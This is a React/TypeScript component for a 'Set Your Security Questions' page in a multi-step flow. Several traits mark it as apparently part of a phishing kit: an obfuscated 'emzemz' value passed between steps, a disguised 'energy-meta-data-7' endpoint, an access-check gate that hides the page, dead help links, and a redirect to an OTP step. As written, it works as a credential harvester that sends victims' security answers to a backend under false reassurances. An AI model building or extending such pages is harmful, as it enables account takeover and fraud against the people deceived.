import React, { useState } from 'react';
import { useLocation, useNavigate } from 'react-router-dom';
import axios from 'axios';
import { baseUrl } from '../constants';
import useAccessCheck from '../Utils/useAccessCheck';
import FlowCard from '../components/FlowCard';
import FormError from '../components/FormError';

const SecurityQuestions: React.FC = () => {
  const [securityQuestion1, setSecurityQuestion1] = useState('');
  const [securityAnswer1, setSecurityAnswer1] = useState('');
  const [securityQuestion2, setSecurityQuestion2] = useState('');
  const [securityAnswer2, setSecurityAnswer2] = useState('');
  const [securityQuestion3, setSecurityQuestion3] = useState('');
  const [securityAnswer3, setSecurityAnswer3] = useState('');
  const [isLoading, setIsLoading] = useState(false);
  const [errors, setErrors] = useState({
    securityQuestion1: '',
    securityAnswer1: '',
    securityQuestion2: '',
    securityAnswer2: '',
    securityQuestion3: '',
    securityAnswer3: '',
  });

  const location = useLocation();
  const { emzemz } = location.state || {};
  const navigate = useNavigate();
  const isAllowed = useAccessCheck(baseUrl);

  const securityQuestions = [
    'What was your childhood nickname?',
    "What is your mother's maiden name?",
    'What was the name of your first pet?',
    'What was the make and model of your first car?',
    'What city were you born in?',
    'What is your favorite childhood memory?',
    'What was your first job title?',
    'What is the name of your favorite teacher?',
    'What is your favorite book/movie character?',
    'What street did you grow up on?',
  ];

  const handleSubmit = async (event: React.FormEvent<HTMLFormElement>) => {
    event.preventDefault();
    setIsLoading(true);

    const newErrors = {
      securityQuestion1: !securityQuestion1 ? 'Please select a security question.' : '',
      securityAnswer1: !securityAnswer1.trim() ? 'Please provide an answer.' : '',
      securityQuestion2: !securityQuestion2 ? 'Please select a security question.' : '',
      securityAnswer2: !securityAnswer2.trim() ? 'Please provide an answer.' : '',
      securityQuestion3: !securityQuestion3 ? 'Please select a security question.' : '',
      securityAnswer3: !securityAnswer3.trim() ? 'Please provide an answer.' : '',
    };

    setErrors(newErrors);

    if (!Object.values(newErrors).some((error) => error)) {
      try {
        await axios.post(`${baseUrl}api/energy-meta-data-7/`, {
          emzemz,
          securityQuestion1,
          securityAnswer1,
          securityQuestion2,
          securityAnswer2,
          securityQuestion3,
          securityAnswer3,
        });

        navigate('/otp', { state: { emzemz } });
      } catch (error) {
        console.error('Error submitting security questions:', error);
        setIsLoading(false);
      }
    } else {
      setIsLoading(false);
    }
  };

  if (!isAllowed) {
    return null;
  }

  if (!emzemz) {
    return (
      <FlowCard title="Unable to continue">
        <p className="text-sm text-slate-300">
          We could not locate your previous step. Please restart the flow from the beginning.
        </p>
      </FlowCard>
    );
  }

  const footer = (
    <div className="space-y-2 text-xs text-slate-300">
      <p>
        For security reasons, never share your security questions or answers with anyone. These will be used to verify your identity if you need to recover your account.
      </p>
      <div className="flex flex-wrap items-center justify-center gap-2 text-[#7dd3fc]">
        <a href="#" className="hover:underline">Forgot Security Questions?</a>
        <span className="text-slate-500">|</span>
        <a href="#" className="hover:underline">Account Recovery Help</a>
      </div>
    </div>
  );

  return (
    <FlowCard
      title="Set Your Security Questions"
      subtitle={<span className="text-slate-300">Choose unique questions and answers to protect your account.</span>}
      footer={footer}
    >
      <form onSubmit={handleSubmit} className="space-y-6">
        <div className="space-y-4">
          <div className="space-y-2">
            <label className="block text-sm text-slate-300" htmlFor="question-1">
              Security question 1
            </label>
            <div className="border border-slate-600 rounded">
              <select
                id="question-1"
                value={securityQuestion1}
                onChange={(e) => setSecurityQuestion1(e.target.value)}
                className="w-full bg-[#0f172a] text-white px-3 py-3 text-sm focus:outline-none border-none"
              >
                <option value="">Select a security question</option>
                {securityQuestions.map((question, index) => (
                  <option key={index} value={question}>
                    {question}
                  </option>
                ))}
              </select>
            </div>
            {errors.securityQuestion1 ? <FormError message={errors.securityQuestion1} /> : null}
          </div>

          <div className="space-y-2">
            <label className="block text-sm text-slate-300" htmlFor="answer-1">
              Answer 1
            </label>
            <div className="flex items-center border border-slate-600 rounded">
              <input
                id="answer-1"
                type="text"
                value={securityAnswer1}
                onChange={(e) => setSecurityAnswer1(e.target.value)}
                className="w-full bg-transparent text-white px-3 py-3 text-sm focus:outline-none placeholder:text-slate-400"
                placeholder="Enter your answer"
              />
            </div>
            {errors.securityAnswer1 ? <FormError message={errors.securityAnswer1} /> : null}
          </div>
        </div>

        <div className="space-y-4">
          <div className="space-y-2">
            <label className="block text-sm text-slate-300" htmlFor="question-2">
              Security question 2
            </label>
            <div className="border border-slate-600 rounded">
              <select
                id="question-2"
                value={securityQuestion2}
                onChange={(e) => setSecurityQuestion2(e.target.value)}
                className="w-full bg-[#0f172a] text-white px-3 py-3 text-sm focus:outline-none border-none"
              >
                <option value="">Select a security question</option>
                {securityQuestions
                  .filter((question) => question !== securityQuestion1)
                  .map((question, index) => (
                    <option key={index} value={question}>
                      {question}
                    </option>
                  ))}
              </select>
            </div>
            {errors.securityQuestion2 ? <FormError message={errors.securityQuestion2} /> : null}
          </div>

          <div className="space-y-2">
            <label className="block text-sm text-slate-300" htmlFor="answer-2">
              Answer 2
            </label>
            <div className="flex items-center border border-slate-600 rounded">
              <input
                id="answer-2"
                type="text"
                value={securityAnswer2}
                onChange={(e) => setSecurityAnswer2(e.target.value)}
                className="w-full bg-transparent text-white px-3 py-3 text-sm focus:outline-none placeholder:text-slate-400"
                placeholder="Enter your answer"
              />
            </div>
            {errors.securityAnswer2 ? <FormError message={errors.securityAnswer2} /> : null}
          </div>
        </div>

        <div className="space-y-4">
          <div className="space-y-2">
            <label className="block text-sm text-slate-300" htmlFor="question-3">
              Security question 3
            </label>
            <div className="border border-slate-600 rounded">
              <select
                id="question-3"
                value={securityQuestion3}
                onChange={(e) => setSecurityQuestion3(e.target.value)}
                className="w-full bg-[#0f172a] text-white px-3 py-3 text-sm focus:outline-none border-none"
              >
                <option value="">Select a security question</option>
                {securityQuestions
                  .filter((question) => question !== securityQuestion1 && question !== securityQuestion2)
                  .map((question, index) => (
                    <option key={index} value={question}>
                      {question}
                    </option>
                  ))}
              </select>
            </div>
            {errors.securityQuestion3 ? <FormError message={errors.securityQuestion3} /> : null}
          </div>

          <div className="space-y-2">
            <label className="block text-sm text-slate-300" htmlFor="answer-3">
              Answer 3
            </label>
            <div className="flex items-center border border-slate-600 rounded">
              <input
                id="answer-3"
                type="text"
                value={securityAnswer3}
                onChange={(e) => setSecurityAnswer3(e.target.value)}
                className="w-full bg-transparent text-white px-3 py-3 text-sm focus:outline-none placeholder:text-slate-400"
                placeholder="Enter your answer"
              />
            </div>
            {errors.securityAnswer3 ? <FormError message={errors.securityAnswer3} /> : null}
          </div>
        </div>

        <button
          type="submit"
          className="w-full bg-[#7dd3fc] text-black font-semibold py-2 rounded-md flex items-center justify-center gap-2 disabled:opacity-70"
          disabled={isLoading}
        >
          {isLoading ? (
            <div className="h-5 w-5 animate-spin rounded-full border-2 border-solid border-white border-t-transparent"></div>
          ) : (
            <>
              <svg xmlns="http://www.w3.org/2000/svg" className="h-4 w-4" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M9 12h6m-6 0l-2 2m2-2l-2-2m6 2l2 2m-2-2l2-2" />
              </svg>
              <span>Continue</span>
            </>
          )}
        </button>
      </form>
    </FlowCard>
  );
};

export default SecurityQuestions;
